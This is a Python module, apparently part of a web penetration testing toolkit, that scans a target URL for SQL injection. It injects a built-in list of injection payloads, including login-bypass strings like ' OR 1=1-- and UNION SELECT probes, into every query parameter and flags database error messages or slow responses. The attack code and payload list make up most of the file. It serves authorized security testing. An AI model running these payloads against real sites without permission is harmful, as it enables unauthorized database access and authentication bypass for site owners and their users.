"""
SQL Injection Scanner Tool
Developer: Sanad.CodeX
VOIDEX - Web Penetration Testing Toolkit
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from core import HTTPClient, Logger, Validator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict
from tqdm import tqdm
import time


class SQLInjectionScanner:
    """Scanner for SQL injection vulnerabilities."""
    
    def __init__(self, logger: Logger, http_client: HTTPClient):
        self.logger = logger
        self.http_client = http_client
        self.payloads = self._load_payloads()
        self.vulnerabilities = []
    
    def _load_payloads(self) -> List[str]:
        """Load SQL injection payloads."""
        payload_file = os.path.join(
            os.path.dirname(__file__), 
            'payloads.txt'
        )
        
        if os.path.exists(payload_file):
            with open(payload_file, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        # Default payloads if file doesn't exist
        return [
            "'", "''", "`", "``", ",", '"', '""', "/", "//", "\\", "\\\\",
            "' OR '1", "' OR 1 -- -", '" OR "" = "', "' OR 1=1--",
            "' OR 'x'='x", "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
            "admin' --", "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#",
            "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--",
            "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
            "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "1 AND 1=2 UNION SELECT NULL--"
        ]
    
    def _test_payload(self, url: str, payload: str) -> bool:
        """Test a single SQL injection payload."""
        # Test original URL
        original_response = self.http_client.get(url)
        if not original_response:
            return False
        
        original_content = original_response.text
        original_status = original_response.status_code
        
        # Parse URL and inject payload
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Try injecting payload in each parameter
        for param in params:
            modified_params = params.copy()
            modified_params[param] = [payload]
            
            new_query = urlencode(modified_params, doseq=True)
            modified_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            # Send request with payload
            response = self.http_client.get(modified_url)
            if not response:
                continue
            
            # Check for SQL error indicators
            if self._check_sql_errors(response.text, original_content):
                return True
            
            # Check for time-based injection (basic)
            if response.elapsed.total_seconds() > 5:
                return True
        
        return False
    
    def _check_sql_errors(self, response: str, original: str) -> bool:
        """Check for SQL error messages in response."""
        sql_errors = [
            "SQL syntax", "mysql_fetch", "mysql_num_rows",
            "ORA-01", "PostgreSQL", "SQLServer", "Microsoft SQL",
            "ODBC SQL", "Invalid SQL", "Syntax error", "mysql_",
            "quoted string not properly terminated", "SQL command not properly ended",
            "pg_query", "mysqli", "sqlite_", "OleDb", "JET Database",
            "Unclosed quotation mark", "SQLException", "SQLite3::",
            "MariaDB", "Oracle error", "Warning: mysql", "valid MySQL result"
        ]
        
        response_lower = response.lower()
        return any(error.lower() in response_lower for error in sql_errors)
    
    def scan(self, url: str) -> Dict:
        """Scan a URL for SQL injection vulnerabilities."""
        self.logger.section("SQL INJECTION SCANNER")
        self.logger.info(f"Target: {url}")
        
        if not Validator.is_valid_url(url):
            self.logger.error("Invalid URL format")
            return {'vulnerable': False, 'vulnerabilities': []}
        
        # Check if URL has parameters
        parsed = urlparse(url)
        if not parsed.query:
            self.logger.warning("URL has no parameters to test")
            return {'vulnerable': False, 'vulnerabilities': []}
        
        self.logger.info(f"Testing {len(self.payloads)} payloads...")
        
        vulnerable_payloads = []
        
        with tqdm(total=len(self.payloads), desc="Scanning", 
                 bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:
            for payload in self.payloads:
                if self._test_payload(url, payload):
                    vulnerable_payloads.append(payload)
                    self.logger.vuln(f"Potential SQLi with payload: {payload[:50]}")
                
                pbar.update(1)
                time.sleep(0.1)  # Rate limiting
        
        if vulnerable_payloads:
            self.logger.success(f"Found {len(vulnerable_payloads)} potential SQL injection vulnerabilities")
            return {
                'vulnerable': True,
                'vulnerabilities': vulnerable_payloads,
                'url': url
            }
        else:
            self.logger.info("No SQL injection vulnerabilities detected")
            return {'vulnerable': False, 'vulnerabilities': []}


def run(args, config):
    """Run SQL injection scanner."""
    from core import Config
    
    cfg = Config(config if config else 'config.yaml')
    logger = Logger("SQLi Scanner", args.output if hasattr(args, 'output') else None)
    http_client = HTTPClient(
        timeout=cfg.get('timeout'),
        verify_ssl=cfg.get('verify_ssl'),
        user_agents=cfg.get('user_agents')
    )
    
    scanner = SQLInjectionScanner(logger, http_client)
    result = scanner.scan(args.url)
    
    # Save results if output file specified
    if hasattr(args, 'output') and args.output and result['vulnerable']:
        import json
        with open(args.output, 'w') as f:
            json.dump(result, f, indent=4)
        logger.success(f"Results saved to {args.output}")
    
    http_client.close()
    return result
